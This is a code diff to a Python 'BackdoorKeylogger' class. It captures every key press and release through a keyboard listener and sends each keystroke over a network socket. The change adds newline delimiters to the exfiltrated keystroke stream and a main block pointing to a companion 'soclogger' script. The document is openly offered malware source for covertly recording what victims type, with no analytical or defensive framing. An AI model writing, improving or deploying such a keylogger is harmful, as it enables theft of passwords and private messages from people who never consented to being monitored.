@@ -42,18 +42,18 @@ class BackdoorKeylogger:
 
     def keylogger_press(self, key):
         try:
-            press = "Press {0} ".format(key.char)
+            press = "Press {0} \n".format(key.char)
             self.soc.sendall(press)
         except AttributeError:
-            press = "Press {0} ".format(key)
+            press = "Press {0} \n".format(key)
             self.soc.sendall(press)
 
     def keyloger_release(self, key):
         try:
-            release = "release {0}".format(key.char)
+            release = "release {0} \n".format(key.char)
             self.soc.sendall(release)
         except AttributeError:
-            release = "release {0}".format(key)
+            release = "release {0} \n".format(key)
             self.soc.sendall(release)
 
     def socket_listener(self):
@@ -63,3 +63,7 @@ class BackdoorKeylogger:
         with keyboard.Listener(on_press=self.keylogger_press, on_release=self.keyloger_release) as listener:
             listener.join()
 
+
+
+if __name__ == "__main__":
+    print ("\033[1;32m Run the soclogger script \033[1;m")
